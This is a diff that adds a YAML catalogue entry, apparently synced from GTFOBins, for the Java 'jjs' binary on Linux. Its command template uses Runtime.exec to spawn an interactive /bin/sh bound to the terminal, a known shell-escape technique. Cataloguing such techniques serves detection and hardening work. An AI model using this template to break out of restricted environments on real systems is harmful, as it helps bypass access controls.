@@ -1,0 +1,26 @@
+id: gtfobins/jjs/shell/unprivileged
+type: binary
+platform: linux
+name: jjs
+phases:
+- execution
+capabilities:
+- shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'jjs
+
+    Java.type(''java.lang.Runtime'').getRuntime().exec(''/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty
+    2>/dev/tty'').waitFor()'
+references:
+- https://gtfobins.github.io/gtfobins/jjs/
+tags:
+- linux
+- unix
+- gtfobins
